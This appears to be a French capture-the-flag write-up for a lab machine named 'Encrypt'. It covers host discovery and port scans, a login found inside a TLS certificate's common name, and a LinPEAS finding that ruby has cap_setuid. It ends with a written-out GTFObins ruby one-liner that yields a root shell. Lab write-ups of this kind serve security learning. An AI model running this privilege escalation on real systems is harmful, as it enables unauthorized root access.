# Encrypt

🖥️ **rNET**

Découverte d’hotes

```
┌──[m0rph3u5@parrot]─[~/Scripts]
└──╼ $sudo ./rNET.sh 
                                               
░       ░░░   ░░░  ░░        ░░        ░
▒  ▒▒▒▒  ▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒
▓       ▓▓▓  ▓  ▓  ▓▓      ▓▓▓▓▓▓▓  ▓▓▓▓
█  ███  ███  ██    ██  ███████████  ████
█  ████  ██  ███   ██        █████  ████
                                                   
                                                
by M0rPH3U53

🔍 Scan ARP...100%
 
[+] Hotes 
 
┌────────────────┬───────────────────┬──────────────────────────────┐
│       🖥️       │         ⚙️        │              🏭              │
├────────────────┼───────────────────┼──────────────────────────────┤
│ 192.168.56.1   │ 0a:00:27:00:00:00 │ Unknown vendor               │
│ 192.168.56.2   │ 08:00:27:06:49:51 │ PCS Systemtechnik GmbH       │
│ 192.168.56.254 │ 08:00:27:05:87:b3 │ PCS Systemtechnik GmbH       │
└────────────────┴───────────────────┴──────────────────────────────┘
 
[+] Total: 3
```

&nbsp;

<span style="color: #dddddd;">👁️</span> **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
[+] 443/tcp open
 
📄 Rapport --> /home/m0rph3u5/Massap
```

&nbsp;

**🔐 mET**

Recuperation des info du certificat

```
┌─[m0rph3u5@parrot]─[~/Scripts]
└──╼ $sudo ./mET.sh

                     _/_/_/_/  _/_/_/_/_/
   _/_/_/  _/_/    _/            _/
  _/    _/    _/  _/_/_/        _/
 _/    _/    _/  _/            _/
_/    _/    _/  _/_/_/_/      _/                                                             

by M0rPH3U53                                                                
 
[+] Réseau disponible 
 
10.0.3.0/24
192.168.56.0/24
 
[i] Network: 192.168.56.0/24
 
🔍 Scan ssl-cert...100%
 
🔐 Hotes avec certificat

[+] 192.168.56.254
 
💾 Sauvegardé --> /home/m0rph3u5/Scripts/mET
```

&nbsp;

Login trouvé

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $cat Scripts/mET/192.168.56.254-certSSL.txt
443/tcp open  https   syn-ack
| ssl-cert: Subject: commonName=iot:Goat123!
| Issuer: commonName=iot:Goat123!
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-26T17:58:58
| Not valid after:  2027-05-26T17:58:58
| MD5:   9d69:f384:3471:469e:3dd1:94ad:b463:54b9
| SHA-1: 37d1:c506:b5c4:b97c:4bcf:0736:d73e:ebdd:e1c8:89dd
| -----BEGIN CERTIFICATE-----
| MIIDDzCCAfegAwIBAgIUVb1kn6YtHaUKyanwpBfirAyt1Z0wDQYJKoZIhvcNAQEL
| BQAwFzEVMBMGA1UEAwwMaW90OkdvYXQxMjMhMB4XDTI2MDUyNjE3NTg1OFoXDTI3
| MDUyNjE3NTg1OFowFzEVMBMGA1UEAwwMaW90OkdvYXQxMjMhMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxIVtEEriGe1x9FGilEIElPBJfIdEHfyNypuA
| IT4fAzhu+6AN9LLuKXHKLEToEtrFT84VqFb67jLoZgXfX1anQRW154zwLBarEAu4
| Wd7R1A1zsqjaNl7G7907B9M/Uaa/wFtIuqZKExxAie0slyxYaXzmP7F/58A3f+7K
| 4vSTdv6aPBNXsq1c2VGm8ZonI5AWTFooSWBQpqiPqquoQzSX5vnFBhLAJh+1F0Re
| mRZisoAwI/frqrI7HksRX+vSx0BvAitOj38EhnTUq8eOcKcXeg7r+yzYAh6eVgpH
| da/6f+42NCSeArdUz4zZz4jq1CXmTQf0WC5svpqHkhkYV3v0CQIDAQABo1MwUTAd
| BgNVHQ4EFgQUZMbQMYnerh+NtqpUBKknjas9uTswHwYDVR0jBBgwFoAUZMbQMYne
| rh+NtqpUBKknjas9uTswDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAnZ603AR8Gp9jXi0fYtCtM9xBznBiw5sjF0M36A5A2umsy0RoT9bh6T6Z+ZXz
| ZFW55Y7hU+ofd0MsGe4AuAKlUOlrbcoCv1NfQCbpRkg0c6av7vDyq5sR3muONbYw
| kUN7mQoCnBzYoajqr9DqxdIh0gdPLXNhl/Avls6WWpJnENCvxzdUJMvPHm7vokLF
| cLq3vKSWoGbAEfAEBC9m++71gpHuQX66gTY9Gch+PilfUJyL3ZvCpOePFhfLemRG
| Fr8UfdndioZ2Pgs1A7cyCWx5G4Lhs7FMrUvwKENno5P/cPQVJTowdfPCADLXGsan
| /ic0xJNm+77z1A4ZHgUj4WJh8Q==
|_-----END CERTIFICATE-----
```

&nbsp;

**🛰️ fullEx**

Élévation de privilège

```
iot@encrypt:~/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/ruby3.3 cap_setuid=ep
```

&nbsp;

#️⃣ **GTFobin - ruby**

**[https://gtfobins.org/gtfobins/ruby/#shell](https://gtfobins.org/gtfobins/python/#shell)**

```
iot@encrypt:~$ ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
root@encrypt:~# 
```